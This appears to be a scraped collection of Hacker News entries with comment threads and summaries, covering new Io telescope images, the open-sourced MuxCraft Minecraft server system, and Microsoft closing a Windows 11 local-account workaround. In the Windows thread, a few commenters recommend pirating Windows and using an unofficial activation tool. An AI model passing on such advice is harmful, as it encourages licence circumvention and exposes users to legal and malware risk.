arktic, probably should do that with some llms as well reply CamperBob2 4 hours agorootparentRod Serling beat us to it, I think: https://www.imdb.com/title/tt0734669/ reply jiggawatts 9 hours agoprevnext [–]reply perihelions 8 hours agoparentWrong thread! reply jcims 4 hours agoprevIO's diameter ~3600km Avg distance to earth ~628m km Apparent diameter is ~5 microradians or ~1 arcsecond Similar to imaging a marble 5mm in diameter from 1km away. Betelgeuse is ~1.2 billion km in diameter (for now, lol) It's 642 light years away. It's apparent diameter is .2 microradians, or approximately a red blood cell from 35m away. Space is big. Things are small. reply yayr 11 hours agoprev [–] it looks like for around 1 BTC you could get one full night access to this amazing instrument :-) (you'll probably have to convert it to cash though before) https://www.lbto.org/lbt-access/ reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "New high-resolution images of Jupiter's moon Io, captured by the Large Binocular Telescope (LBT) in Arizona, reveal surface features as small as 50 miles across, comparable to spacecraft imagery.",
      "The SHARK-VIS instrument and adaptive optics enabled these detailed observations, showing a major resurfacing event around the volcano Pele, highlighting Io's intense volcanic activity driven by tidal heating.",
      "Published in *Geophysical Research Letters*, these findings enhance understanding of volcanic processes on Io and other solar system bodies, thanks to the unprecedented sharpness provided by the SHARK-VIS instrument, developed by the Italian National Institute for Astrophysics."
    ],
    "commentSummary": [
      "The comparison highlights that while ground-based telescopes like the Large Binocular Telescope (LBT) are cost-effective and provide consistent data, they cannot match the resolution of space-based instruments.",
      "Enhanced by adaptive optics, ground-based telescopes can still achieve impressive results, but advanced imaging techniques like adaptive optics and lucky imaging are crucial for mitigating atmospheric interference.",
      "The discussion also covers the superior quality of scientific CMOS sensors over consumer camera sensors and debates the potential and limitations of AI in enhancing astronomical images, with concerns about the scientific validity of AI-generated images."
    ],
    "points": 164,
    "commentCount": 50,
    "retryCount": 0,
    "time": 1717466249
  },
  {
    "id": 40566533,
    "title": "Germany's Oldest Minecraft Server Shuts Down, Open Sources Entire System",
    "originLink": "https://github.com/muxcraftserver/MuxSystem",
    "originBody": "MuxSystem Das originale MuxCraft System, v10. Alle Server Dateien findest du auf https://muxcraft.eu Features Shop GemShop: Automated Market Maker for users to switch between Coins and Gems. Purchase Items, Ranks & more with Gems. Shop: Visual Player Shop that works like the stock market. The cheapest offer is shown. Dynamically tracks the cheapest price for each item, updates last known prices, and keeps track of the volume of items sold. Item prices fluctuate based on supply and demand. Earn coins from other players by selling, or buy items. GUI for adding items, updating prices, removing items, and bulk editing features. Premium Market: User-friendly auction house for items not in the shop. Mining: Mine ores in the wilderness to earn coins. Inflation-adjusted rewards. Trading System: Trading GUI to safely trade items, coins between two players. Robust mechanisms and alerts to players to prevent fraud. Bases Create & reset bases Loads & unloads base chunks as needed to optimize performance Invite friends to base (temporarily or permanently) Griefing (/grief): Bases become griefable after 72 hours of inactivity (not during whitelist) Automatic calculation of base value based on block prices in the MuxShop. Base Ranking (/basen) Base Spectator/Visiting - /base [name] (Gamemode 3) Save base as schematic (only with GOLD Rank) Vote to extend your base daily Helper NPC Custom Scoreboards when on own base, visiting or griefing Anti Lag System TPS Monitoring Completely automated anti lag system Entity & Farms Management: Reduces lags from entities & farms Item & Drop Management: Prevent lag due to excessive item drops Prevent Interaction & Packet Spam Chunk Management & Cleanup Redstone Optimization Performance Report (/lag) Ping Report (/ping) Bot Detection System Verification check via simple Book GUI if using VPNs & other suspicious behaviors Auto Enchanting Checks Mining Bot Checks Auto-Detect Chatbots (0% false flags) (Analyzes player chat messages to identify potential spam bots, using pattern recognition and comparison of messages across different players, perma mutes it) Casino Realistic Games like Slot Machine, Crash, Scratch Cards, Roulette, CoinFlip, Wheel Of Fortune, Six Fields, Rock Paper Scissors, Item Flip, Guess The Number, Blackjack, Texas Holdem. Realistic Casino Effects & Decorations Bank (Switch MuxCoins to Chips and Chips to MuxCoins) Energy System for players (Replenish with chips) Special Areas for ULTRA & Gold Barkeepers, DJs, Security Guards, Play Music Custom Scoreboard for Casino Events Automated Event System Chat Events, Normal Events & Big Events AnvilDrop, Arena, BlockParty, Boss, Button, Chamber, Custom, DropSearch, Dropper, EXP, Exit, FastChat, GetDown, GiveAll, Guess, GunWar, Guns, Jump, LastChat, Lotto, Mine, Quiz, Random, Splegg, SurvivalGames, TNT, TNTRun, TempleRun, TopArena, Tournament, Varo, War. MuxSearch Events for different holiday events (Easter eggs, Candies on Halloween, etc) Spectate players during Events Inflation-adjusted rewards Custom Scoreboard for each Event Extras Extras GUI (/extras) Perks (permanent potion effects) Realistic Bike (your friend can also mount it) Animated Emoji Heads Mounts Pets Boosters (Fly Booster, XP Boosters, Spawner Boosters) Multi Tools Crates / Chests (Dynamically updated items based on the prices in the MuxShop) Extra Commands Expanded Enderchest Blood Bending (for Mobs only) Holiday Specials Christmas Penguins, Halloween Pumpkins, Advent calendar Marketing Affiliate System (earn money by inviting players), Cashback for YouTubers Email System (collect valid emails & answer to support tickets) Gift Codes (create, delete, use - /giftcode) Newbie Infos & Rewards Recurring Tips on how to play Voting System (Voting required for: Access to Base, Expand Base, Casino, Search Event, Give All, Random, Open Chests, Advent, Menu, Homes, /profile, /repair, /tpa, /tpahere, /tpaccept, Ore Mining, 1vs1, /sell, /trade, Clan Base, Warps (Shop)) Main Player Menu Dynamic based on your progress and rank Easy GUI Settings (blood effect, chat filter, global chat, profile view, support) Admin Settings (fly, vanish, chatprefix, \"focus mode\", forcefield) Team Base Management Misc (MuxSystem): Full History (/history), (Coin, Gem, Casino, Command, Death, Teamactions, Teleport, Payment, Support History) Homes (/home), (GUI, create, view, delete homes, admin management) Payment System (accept paysafecards ingame) Warp System (/warp) (create, view, delete, visit warps. Random Teleport) Shared MySQL Database (Works across multiple servers, updating with netty packets) Right Click Player Menu (right click player) Teleport Management (TPA Requests) Async Player Data Saving, Scheduling Tasks Cooldown Management Custom Book GUIs Current Location in tab list Clickable, hoverable chat messages MuxTeam Server Analytics Admin Menu (/admin) (set different server settings, see analytics & more) Punish System (Chat slowdowns, PvP Bans, Auto Perma Mutes for Bots) ChatFilter (/chatfilter) (GUI, advanced word blacklist system) Player Overview (/o), (GUI, manage players: resetting stats, managing homes, teleportation, and health management, banning, kicking, and controlling permissions) Polls (run public or private polls with multiple options & see results) Report players (/report), Chatreports & Cheatreports, GUI for admins to see reports & act on them Support System (/support) (Create, manage, close support session. Transfer support to other supporter. Notify/alert system, rotate supports to different supporters so nobody can \"snipe\" them, save conversation history & response times. Shows FAQ to player before he can ask for support. Ban players from support (24h)) Team Overview (/team) (See a full list of team commands and features) User Transfer (transfer all user data from one player to another) Vanish System (hide from players/admins, depending on your rank) PvP 1vs1 (/1vs1), (Arena System for 1vs1 fights, Random Kits, unranked after 3 days of inactivity, Custom scoreboard) ClanWars (/cw) (Create fights between clans, dynamic arena system, set entry costs, healing limits, bodyfix/op apples on/off, Custom scoreboards) Training (/training) (Dynamically creates PvP Bots in the same arena, only shown to player. Custom Bot movement, Pathfinding, visual & sound effects, attributes & behaviors) PvP Stats, Trophy System (/stats), Leagues Monthly seasons with winners Ranks Custom Permission system Various User Ranks with Benefits & GUIs Temporary ranks (GOLD) VIP, ELITE, EPIC (Diamond in Menu), ULTRA (/ultra), GOLD (/gold), Creator (/creator) Social Friendship System (with online alerts) Clan System: Create, join, manage, and leave clans; clan-specific GUIs for different member ranks; invite members; clan-exclusive chat; clan base; clan rankings and trophies. Chat System: Advanced Chat Spam Protection: Utilizes intelligent spam detection and character repetition analysis to prevent chat spam. Adaptive Word Blacklisting, IP and Domain Filtering. Staff-only chat. Utilities Fake Snow Scoreboard Manager NPCs Player NPCs Packet Manager Offline Player Editing Language Play Music Holograms Giant Items Fireworks Old Enchanting, Blood Effects Chairs Bossbar Anvil Input Duplication Glitch Fixes Confirm Inventory Page Inventory Creator and much more... Bibliotheken Dieses Projekt verwendet eine Reihe von Bibliotheken, die im libs Ordner des Projekts zu finden sind. Bauen des Plugins Das Projekt wird mit dem Artifact-System von IntelliJ gebaut. Hier sind die Schritte, die du befolgen musst: Öffne dein Projekt in IntelliJ IDEA. Navigiere zu File > Project Structure. Wähle im linken Menü Artifacts. Klicke auf das Plus-Symbol oben links und wähle JAR > Empty. Ziehe nun zuerst xyz compile output in den Output Layout Bereich. Jetzt machst du rechtsklick auf Client-1.0.2-RELEASE.jar und wählst Extract to Output Root. Wiederhole Schritt 6 mit Server-1.0.2-RELEASE.jar, Shared-1.0.2-RELEASE.jar, mail-1.5.0.jar, json-20210307.jar, httpclient-4.5.13.jar und httpcore-4.4.13.jar. Klicke auf OK, um das Artifact zu erstellen. Die Artifakte sollten am Ende ungefähr so aussehen: Zum Bauen des Plugins klicke auf Build > Build Artifacts und wähle Build. Das Plugin wird nun im out Ordner des Projekts erstellt. Verwendung des Projekts Nach dem Bauen des Projekts musst du die erstellte JAR-File in den plugins Ordner deines Servers hochladen. Zusätzlich musst du den MuxSystem Ordner, der Standarddateien enthält, ebenfalls in den plugins Ordner deines Servers hochladen. Bitte beachte, dass du eventuell die Konfigurationsdateien im MuxSystem Ordner anpassen musst, um das Plugin korrekt auf deinem Server zu konfigurieren. Einrichtung der MySQL-Verbindung Um eine MySQL-Verbindung für dieses Projekt einzurichten, musst du die config.yml Datei im src/main/java Verzeichnis bearbeiten. Hier sind die Schritte, die du befolgen musst: Die Shared Datenbank wird verwendet, wenn man mehrere Server hat. Bei nur einem Server können hier die gleichen Daten wie bei der normalen Datenbank eingetragen werden. Öffne die config.yml Datei in deinem bevorzugten Texteditor. Suche nach dem Abschnitt database unter #############>>MYSQL<<#############. Ändere die Werte username, password und url unter database und shared auf deine MySQL-Datenbankdetails. Zum Beispiel: database: username: deinUsername password: deinPasswort url: jdbc:mysql://deineServerAdresse:3306/deineDatenbank?autoReconnect=true&maxReconnects=3 shared: username: deinUsername password: deinPasswort url: jdbc:mysql://deineServerAdresse:3306/deineDatenbank?autoReconnect=true&maxReconnects=3 Speichere die Änderungen und schließe die Datei. Jetzt ist dein Projekt so konfiguriert, dass es eine Verbindung zu deiner MySQL-Datenbank herstellt, wenn es ausgeführt wird.",
    "commentLink": "https://news.ycombinator.com/item?id=40566533",
    "commentBody": "Oldest largest German Minecraft server shut down and open sourced everything (github.com/muxcraftserver)163 points by espresso39 23 hours agohidepastfavorite39 comments H8crilA 22 hours agoBTW, this is the actual oldest server (and it's still up): https://minecraftonline.com/ This is a close contender (it's is also up, and really thriving; it's even on close to the latest version): https://en.wikipedia.org/wiki/2b2t I can recommend 2b2t if you don't mind the 4chan-like mentality in the chat. Probably the only server where coding is actually a desired, core skill in factions/teams/groups. reply pests 22 hours agoparentWhile yes 2b2t is on a modern version most of its history was spent on 1.12. Only last year did they jump to 1.9 and only in the last few months to 1.20. Not knocking it, just most of the old builds and metas were based on 1.12. reply zarathustreal 21 hours agorootparentIs 1.12 not more modern than 1.9? reply youainti 21 hours agorootparentI think they dropped a 1, i.e. they meant to type 1.19 reply unholiness 21 hours agorootparentprevHe means 1.19 reply pests 19 hours agorootparentprevYes, meant 1.19. reply LoganDark 21 hours agorootparentprevDo you mean 1.19? reply axus 21 hours agoparentprevSome recent examples of coding exploits for 2b2t: https://news.ycombinator.com/item?id=40067857 https://news.ycombinator.com/item?id=29615428 reply aidenn0 19 hours agoparentprevI don't think that server is German though? Headline at this moment in time is \"Oldest largest German Minecraft server shut down...\" reply icepat 20 hours agoparentprevI saw this and thought it was MinecraftOnline that shutdown. MCO has a great community, and is pretty much the anti-2b2t. MCO is also German. reply H8crilA 3 hours agorootparentThey really are the Yin and Yang of Minecraft. reply SunlitCat 23 hours agoprevMinecraft was the first game, someone on the \"internet\" gifted me. I was like \"Why do you do that?!\" and he was just like, because it's cool to play with you. Ahhhh! Fond memories. :) reply Zambyte 22 hours agoparentMinecraft was the first game I made long term friends from the internet in. I went on to play other games with my friends from minecraft for years. My first real relationship was with someone I met on Minecraft. I flew across the US to visit her multiple times in high school (working as a dishwasher to buy tickets). 7 years later I bought her and her child plane tickets to visit me (earlier this year). Also Minecraft got me into programming in Java, which let to my programming career. So yeah... Minecraft has been a pretty big part of my life, even if I mostly stopped playing it in early high school :P reply SunlitCat 22 hours agorootparentActually that is an heartwarming story and a great example how games (and gaming) can connect people and how it can inspire careers! Thank you for sharing! reply shepherdjerred 20 hours agorootparentprevMinecraft is also how I got into programming! Hundreds of hours spent writing Java plugins for CraftBukkit/Spigot :) reply rekttrader 21 hours agorootparentprevThat’s a great story! Kudos good human! reply confused_boner 21 hours agoparentprevI sent $20 via USPS to a friend with a credit card who purchased it on my behalf. Good times. reply SunlitCat 14 hours agorootparentActually that's pretty awesome to have someone trustworthy to do such things! reply mathgradthrow 23 hours agoparentprevgosh, thats a beautiful little story. reply SunlitCat 22 hours agorootparentThank you! It was really an awesome time way back and made me aware that, gifting other people games is a nice thing to do. reply ct0 22 hours agoprevNever forget logging into mau5ville (deadmau5's server) and being blown away by the digital architecture and activity. Great times. reply espresso39 23 hours agoprevMuxCraft used to be one of the largest EU servers back in 2012-2014 Proof: https://web.archive.org/web/20140829145028/minecraft-serverl... reply KomoD 22 hours agoparentWould not go as far to say \"one of the largest EU servers\", maybe one of the largest German servers reply espresso39 22 hours agorootparentGermany does have the biggest EU user base, but you’re right, the language was german reply codetrotter 22 hours agoprevhttps://muxcraft.eu/ Their website with the announcement also links to the following: > Alle Dateien vom MuxCraft Server. > Enthält: Maps, Schematics, Server & Plugins, Bilder, Designs, Website. https://archive.org/details/muxcraft Not sure if it’s the same, or some extra data, compared to what they put on the linked GitHub reply misterpigs 22 hours agoprevThese servers were a lot of fun. You got to pay taxes _in a game_! But seriously they were a lot of fun. reply lyu07282 22 hours agoprevFuck those pay2win servers, they are exploitative, promote gambling and pray on children. reply devin 21 hours agoparentI do agree that it is lame. However, money sinks like gambling can be seen as a part of the in-game economy and are a useful tool to take money out of circulation. I don’t necessarily have a problem with judicious use of it, but if the point of the server becomes buying in-game currency to lose it at the poker table, then yeah, that’s exploiting your users. reply robertlagrant 19 hours agorootparent> and are a useful tool to take money out of circulation What does this mean? What money is being taken out of circulation? reply bravetraveler 19 hours agorootparentI assume the money going into their pocket, 10/10 thieves (winners) recommend theft (winning) That's totally hyperbole. Perhaps they find themselves luckier than average - like most :) People overestimate this fairly easily/often. It's vague... Counter point: opportunity cost. Nobody can say what will/won't happen, why even try to guess at this. Most endeavors don't go as poorly as gambling. In my experience at least reply moehm 19 hours agorootparentprevIf they talk about in-game currency, probably they mean mudflation. It's like inflation, but in games. If you can produce in-game currency out of nothing, the value drops. reply robertlagrant 10 hours agorootparentOh - I see. In-game currency is taken out of circulation. reply espresso39 22 hours agoparentprevMuxCraft did not have any gambling until 2020, where it was already in serious decline like most older german servers They added gambling as what seemed a last ditch effort to attract new users reply 12345hn6789 22 hours agoparentprevYup. Folks like to bring up Roblox (rightfully) with regards to gambling and hosting shady real $money shops for in game items but AFAIK (public) Minecraft servers have been doing this since at least 2012. \"Pay $20 for a 'rank' on our server! You get extra goodies!\". \"This special diamond sword is only $1!\". Really an under reported stat imo. These servers are under the radar. reply kleiba 21 hours agoprevBtw, how is Levers and Chests coming along? reply hoten 22 hours agoprevAnyone know what is Blood Bending? reply jjice 22 hours agoparentI'm only aware of it in the context of Avatar The Last Airbender. I'd assume this is a gameplay mechanic based on that? https://avatar.fandom.com/wiki/Bloodbending reply doublerabbit 19 hours agoprevMinecraft was the first game to get me fired. Don't play it on a banks computer. Nor visit WikiLeaks for that matter on a banks computer. Nor changed printer status messages via Telnet to \"Out Of Ink - Please insert more blood\" Or even make acknowledgment that was you. I was 17, how I miss that age and getting away with things. reply josephcsible 19 hours agoprev [–] Is there a license? If not, then it's just source-available, not open-source. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "MuxSystem Das originale MuxCraft System, v10, is a comprehensive plugin suite for Minecraft servers, offering a wide range of features to enhance gameplay and server management.",
      "Key features include automated shops, mining and trading systems, base management with anti-griefing, anti-lag measures, bot detection, casino games, event automation, and extensive admin tools.",
      "The system supports multi-server setups using a shared MySQL database and provides detailed setup instructions for IntelliJ IDEA, making it a robust solution for server administrators."
    ],
    "commentSummary": [
      "MuxCraft, the oldest and largest German Minecraft server, has shut down and open-sourced its assets on GitHub, sparking discussions about other long-standing Minecraft servers.",
      "The open-sourced assets include maps, schematics, server plugins, and more, available on GitHub and Archive.org.",
      "Users are reminiscing about their experiences with Minecraft, discussing the impact of the game on their lives and careers, and criticizing pay-to-win and gambling mechanics in servers."
    ],
    "points": 163,
    "commentCount": 39,
    "retryCount": 0,
    "time": 1717442811
  },
  {
    "id": 40572289,
    "title": "Microsoft Blocks Workaround for Creating Local Accounts in Windows 11",
    "originLink": "https://www.pcworld.com/article/2354686/microsoft-blocks-windows-11-workaround-local-accounts.html",
    "originBody": "News Microsoft blocks Windows 11 workaround that enabled local accounts Many users use an e-mail trick to avoid creating a Microsoft account. This has now apparently been stopped by Microsoft. By Laura Pippig Redakteurin PC-Welt Jun 3, 2024 11:18 am PDT Image: Melnikov Dmitriy/Shutterstock.com Before PC users can enjoy everything Windows 11 has on tap, they must first enter an e-mail address that’s linked to a Microsoft account. If you don’t have one, you’ll be asked to create one before you can start setting it up. A frequently used trick to circumvent this block is a small but ingenious step. By entering a random e-mail address and password, which doesn’t exist and causes the link to fail, you end up directly with the creation of a local account and can thus avoid creating an official account with Microsoft. Get windows 11 pro for cheap Windows 11 Pro Price When Reviewed: 199.99 Best Prices Today: $59 at PCWorld Store – Win 11 Pro Upgrade Only$79.99 at PCWorld Software Store Many users prefer this method, as a local account promises more control over their own data and more privacy. However, without a Microsoft account, some useful functions are also lost such as account backup or special features for apps like Copilot. This common method no longer seems to work, as Microsoft has apparently patched this bug. Instead of skipping the account link, you’re led into a kind of continuous loop that doesn’t end until you have entered the correct email address. It looks like Microsoft has blocked the bypass that allowed you to create a local account during Windows 11 setup by typing in a blocked email address. Now it just loops you back to typing in a different account ðŸ™ pic.twitter.com/mKnHToLLQV — Zac Bowden (@zacbowden) June 3, 2024 Previously, it was possible to cut the Internet connection in the Task Manager before creating an account. Microsoft has since removed this workaround. As a result, many people who previously used this method are now forced to enter a working Microsoft account email address and password or use other methods. Bypassing Microsoft account restrictions Another method of bypassing the account lockdown still exists. You simply have to enter OOBE\\BYPASSNRO in the command prompt during the Windows 11 setup process, which allows you to skip the connection to the Internet and thus also the link to a Microsoft account. However, it’s questionable how long this option will remain available. It seems that Microsoft is aiming to make the use of Windows 11 dependent on a Microsoft account. In combination with the increased calls for Windows users to finally switch to Windows 11, this appears to be a controversial combination. This article originally appeared on PC Welt and has been translated from German to English. This article originally appeared on our sister publication PC-WELT and was translated and localized from German. Author: Laura Pippig, Redakteurin PC-Welt Laura ist begeisterte Gamerin sowie Film- und Serien-Fan. Nach ihrem Studium der Kommunikationswissenschaft verschlug es sie direkt in die ersten Redaktionen, um ihre Leidenschaft auszuleben. Seitdem schreibt sie über alles rund um PCs und Technik-Themen und ist seit Mai 2024 bei PC Welt als feste Redakteurin tätig. Recent stories by Laura Pippig: Surprise Windows 11 update drops with helpful goodies galore Microsoft’s Windows 11 upgrade pleas get even more desperate Microsoft is finally changing Word’s annoying default Paste behavior",
    "commentLink": "https://news.ycombinator.com/item?id=40572289",
    "commentBody": "Microsoft blocks Windows 11 workaround that enabled local accounts (pcworld.com)159 points by robtherobber 9 hours agohidepastfavorite218 comments whywhywhywhy 8 hours agoI'm definitely not one of those people who thinks Windows should stay frozen forever as Windows XP, I appreciate we're finally getting 15-20 year old features like search filtering in the task manager. But whoever's bonus metric is tricking people to sign in with MS accounts is really making it a gross experience. I managed to finally get my new machines install on a local account using \"OOBE\\BYPASSNRO\" although none of the instructions I found online worked for some reason, eventually found the script find myself. Then when trying to eventually register Windows it tricked me into converting to a MS account because the license troubleshooter forces you to login to do anything. Next time I boot my machine its asking for my MS password instead of my local password... So that's taught me to never enter my MS account into anything on the desktop because there is a risk it will silently do that. You have a \"Home\" and a \"Pro\" version, really just wish for a world where they do this silly scammy behavior in the Home version and let the Pro version just be an actual tool to use hardware. I'm not using Windows because it's a great operating system I'm only using it because it's the only OS in the Venn diagram of \"Supports Nvidia GPUs\" and \"Runs Adobe CC\", can't they just be happy I use it at all. reply Nullabillity 5 hours agoparent> You have a \"Home\" and a \"Pro\" version, really just wish for a world where they do this silly scammy behavior in the Home version and let the Pro version just be an actual tool to use hardware. This \"it's fine if they scam other people as long as they leave me alone\" attitude is really bizarre to me. If they keep showing you that they can't be trusted… maybe believe them? reply rrrrrrrrrrrryan 3 hours agorootparentI think OPs sentiment translates to \"I'm fine with them charging more money for a version that works without a Microsoft account, so long as it exists.\" reply erremerre 8 hours agoparentprevI was a user of several microsoft services that worked relatively well. On computer I used to have onenote and onedrive. On phone I also had the outlook app to manage all emails. For exactly the very same reason you stated, I have stopped using them. Whilst I can still use them on my android phone, there is no point if they dont sync to my computer, and they don't sync to my computer because I am afraid of putting my microsoft password in anything that is not firefox. Hence, I already moved out from onenote to Joplin (still synced via onedrive), (I am not happy with the move) and I stopped syncing with Onedrive, and will have to move soon to something else. On my phone I stopped having outlook, and I am back to use each app for each email. As you, I am also trap on windows (tried fedora, it simply didn't work). Sad times for people who want just a computer that works. reply PawgerZ 1 hour agorootparentIt's not for everyone, but I have been having great success with Thunderbird for a mail client. Maybe give it a try and see if you like it. reply jasomill 6 hours agoparentprevAccording to the Windows 11 system requirements[1], Windows 11 Home edition requires internet connectivity and a Microsoft Account to complete device setup on first use. So can't you just tell Windows 11 Pro you don't have an Internet connection, given that it's officially optional? [1] https://support.microsoft.com/en-us/windows/windows-11-syste... reply arprocter 5 hours agoparentprevThis is a pretty good step by step: https://www.tomshardware.com/how-to/install-windows-11-witho... reply mistercheph 8 hours agoparentprevPirate it next time! reply benterix 7 hours agorootparentWill pirating it actually solve the issue? MS is not after one-time cash payment (heck, they even offered the upgrade for free), what they want is long-term user milking in various ways, some of them looking pretty grey to me. reply NikkiA 1 hour agorootparentDepends on which 'distro' you pirate, ghostsceptre removes a lot of the asshole-ness. reply whywhywhywhy 6 hours agorootparentprevAlthough I agree with the sentiment of voting with your wallet, but building the foundation of my GPU workstation that could cost me a lot in electricity if a bad actor took control of it on pirated software is ill advised. reply Stagnant 2 hours agorootparentYou can download official ISOs of all of the Windows versions for free directly from Microsoft's servers. Then you just need to activate it and there are plenty of methods to do that without risk of malware. Microsoft seems to care about this so little that one of the most starred repositories in github(MAS) has provided easy one click activation solution for years at this point. reply 7bit 7 hours agorootparentprevIt comes with free root kits as well reply 7bit 7 hours agorootparentprevIt comes with free root kits as well reply Dalewyn 8 hours agoparentprev>and let the Pro version just be an actual tool to use hardware. Pro has Group Policy, among which is an option to block Microsoft account logins at the OS level. It kind of breaks Microsoft 365 subscriptions if you need Office 365, but that's obvious. Other Group Policies include ones to turn off Windows Autoupdates, block OneDrive, block Copilot, and more. reply Y-bar 8 hours agorootparentAny good resources on flipping these switches? reply starkparker 3 hours agorootparentThere's an official spreadsheet of Group Policies that's typically updated alongside major feature releases: https://www.microsoft.com/en-us/download/details.aspx?id=105... Search for Microsoft account or local account and you'll find several relevant policies. reply Dalewyn 7 hours agorootparentprevYes: Open Group Policy Editor and play around. There are so many policies you can configure to your heart's content that it's better to learn by doing than hearing. reply worewood 8 hours agoprevI recently had to install windows on 2 computers after some years without doing it. Had to spend an entire day debloating the thing. Had to use a handful of tools and powershell scripts to do it. I still can't imagine how they managed to make a context menu open in almost a full second. In Windows 9x on a 200Mhz it was instant. A useless one too, because all the options that matter are in the old one. The only thing holding me from Linux is ThrottleStop and MSI Afterburner, which are a must for gaming on my laptop reply ta1243 8 hours agoparent> The only thing holding me from Linux I've spent the last 25 years using linux and seeing this statement. There's always something. reply deaddodo 8 hours agorootparentI've been using Linux for a similar time. To be fair to those people, there were massive roadblocks for ages. 802.11b (then G, A, N, etc) support, Flash while it ruled the roost, DRM-video playback, GPU-acceleration, Bluetooth device support, proper sleep, functional multihead, application support, etc, etc, etc. It's not fair to say \"there's always something\" in a sarcastic tone, when there legitimately has always been something holding people back. Especially on laptops. Is it easier than ever to use? Definitely. Does it support a significant chunk of hardware these days? Yup. Are there actual proprietary/commercial pieces of software on it? Yeah. Does it game now? Sure does. Are there still reasons people might not be able to use it? Definitely. reply baq 8 hours agorootparentprevLet's be honest here, the something is 99% drivers. It was printers, then it was wifi, now it's gpus. DNNs and LLMs at least made the compute part of the gpu driver Linux-native (from the vendors' perspective), one would hope the graphics part of the graphics processor would come next, but alas making big iron do work is done from macos and windows laptops. reply advael 8 hours agorootparentWeird I haven't had a graphics issue since like the 8000 series of cards for like, the normal driving graphics right off the card use case. Optimus is definitely a little fucky with multiple GPUs and sometimes new CUDA versions break libs if you're keeping it bleeding edge updated, but most ML workflows use environment management to get around the clusterfuck that is the python ML ANN ecosystem anyway. Nvidia does a lot of work to make it hard to work with their cards but since GPGPU started taking off in the 2010s this sounds like a blast from the past, as a lot of the need for getting good performance out of cards on compute servers - which inevitably run linux because it has any kind of reasonable headless userspace and is easier to write reliable software for - has driven better driver support in general In discussions between people who don't use linux, their notions of what the pain points even are seem to lag by sometimes over a decade I find myself equally ill-informed on the pitfalls of windows ecosystems of late, except the ones that make the news for how insane they sound, but in my defense I also don't go around claiming I intermittently try to use it but just can't make the jump As microsoft continues to tighten the screws, I just hope all these reluctant users can get out before it's too late reply baq 8 hours agorootparentThe GPU market forces are: - gaming: Windows with a sprinkle of Steam Deck (yay!) - compute: Linux - video decode: Windows (DRM on Linux... yeah) - video encode: mixed (Windows for consumers and smbs, Linux for cloud transcode) Of these, the Steam Deck is the closest to a laptop that we got to. This is actually great, but it didn't result in a noticeable shift in anything, because LLMs took it all. reply advael 6 hours agorootparentI am not sure what point you're trying to make with this collection of non-sequiturs and false statements -The vast overwhelming majority of games are now effectively cross-platform. Work done mostly by valve benefits the entire ecosystem of linux-based OSes, and the sliver of incompatible games that still exist take vast resources to prevent from being made compatible, and thus can only be pulled off by well-resourced studios, most of whom Microsoft either has a deep relationship with or has bought. -I'm glad we at least agree that computers running linux can be used for doing computation, as is true of any computer I would hope -Most video decoding is effectively done on browsers, which are, with the exception of the garbage ones OS vendors keep trying to lock users into despite this being deeply unpopular, run on every platform. DRM is supported by most browsers with some opt-out consent options, and remaining incompatibility with streaming platforms is largely driven by those platforms being able to detect what operating system you're on and specifically trying to prevent playback on that basis. There is no popular codec I am aware of that isn't supported by FFMPEG, let alone by any free software whatsoever -At this point are you just talking about platform adoption? People can encode stuff on whatever system they want. The only market forces are increasingly futile efforts to enforce platform control on the part of content aggregating corporations -Is the thing about laptops referring to the fact that laptops are, through corporate deals, mostly sold with windows as a default operating system on them? There are now several whole OEMs that don't, but the last time I encountered a laptop for which a routine and standard linux install process ran into any issue whatsoever was like 2012, and it felt like a weird edge case then. Maybe I would have if I used fingerprint scanners or some other creepy spyware nonsense? I'm not even looking up laptops before I buy them. One time I had a boss who just bought the most expensive thing he could find at best buy on short notice. I heard it was kinda hard to get new Apple silicon models up and running for a while? For the most part, computers are just computers. It's weird that so much marketing pretends otherwise. The market for GPUs in laptops by and large does not care what operating system they are running, because people are buying the hardware for any of a number of general purposes for which one might use a general purpose computer. If you've done any statistical analysis to support these claims of \"market forces\", are you sure you're not claiming every laptop sold with windows installed by default in your models, despite that everyone running linux on a laptop also has to buy the laptop, but will probably only boot up windows if it forces them to by trying to prevent people from booting into a BIOS menu, and then only to do that? This kind of fuckery will also affect statistics for things like counting browser agents, because every time Netflix does some fuckery to try to gate high-quality streams by OS, someone will write a script or a plugin to spoof the agent of another OS to get around it I find it pretty futile to try to understand \"market forces\" in any sort of factual sense, because the metrics are nebulous, easy to manipulate, and everyone involved has lots of incentives to lie about all of them. But I still don't have any clue what this has to do with whether drivers work, since most people on every operating system just use the same stupid blob of drivers nvidia dutifully provides every platform for every GPU they make, as they have for the last 10 of the roughly 15 years I've had any reason to care about GPU drivers reply gs17 2 hours agorootparent> The vast overwhelming majority of games are now effectively cross-platform That's true (and Proton often works better than a native Linux build), but then there's the few games only run on Windows, often due to anti-cheat (see https://areweanticheatyet.com/). Unfortunately, a lot of developers aren't very interested in making it compatible even when it's definitely possible and not something they're opposed to, e.g. that list shows SMITE as compatible, but Paladins from the same company with the same anti-cheat as incompatible. Almost no games are Linux-only, many are Windows-only. VR can also be a big headache, although I made it worse by getting WMR. Monado is getting there though. reply erremerre 7 hours agorootparentprevIn the year 2024 of our lord, Linux do not works fine with the ultra-common Realtek ALC892 chip for sound, having constant audio skips. Found in a myriad of motherboards from the last decade. This is just my issue, I am pretty sure, there are other loads of drivers issues elsewhere. reply Retric 2 hours agorootparentYou check for compatibility before buying a part and if there’s going to be an issue you buy something else. MacOS doesn’t work on most machines either, but drivers aren’t an issue for Mac users. reply bishbosh 53 minutes agorootparentThis conversation is perpetually marred by this sort of flippant response. No one expects MacOS to work on anything but Apple hardware, but they do expect a random chip on the motherboard they've been using for a several years to work. Proposing they google every chip on their motherboard to see if they can run linux is a failure of linux. I would hope that you consider that dismissive replies like this do little to encourage anyone to adopt linux, and instead make the community seem elitist and off putting. reply Retric 38 minutes agorootparent> random chip on the motherboard they've been using for a several years to work. You can easily check if the motherboard has issues, but this idea you should install on random hardware is a mistake. Linux is not MacOS, but the best time to swap is when you get new hardware. Run into issues and the old Desktop/Laptop still works and there is no need to stress. reply bishbosh 28 minutes agorootparent>this idea you should install on random hardware is a mistake. Why, it works on windows? And it's not 'random hardware' its the hardware they have and use. You should realize this is a failure of linux, not of the user. reply Retric 26 minutes agorootparent> it works on windows So? Linux is not Windows. It’s the advice that’s a problem not the user or Linux. reply ta1243 7 hours agorootparentprev25 years and I haven't had drivers blocking my usage On the other hand I'm sat next to someone really struggling with getting a windows machine to talk to a network at the moment, half an hour of \"General 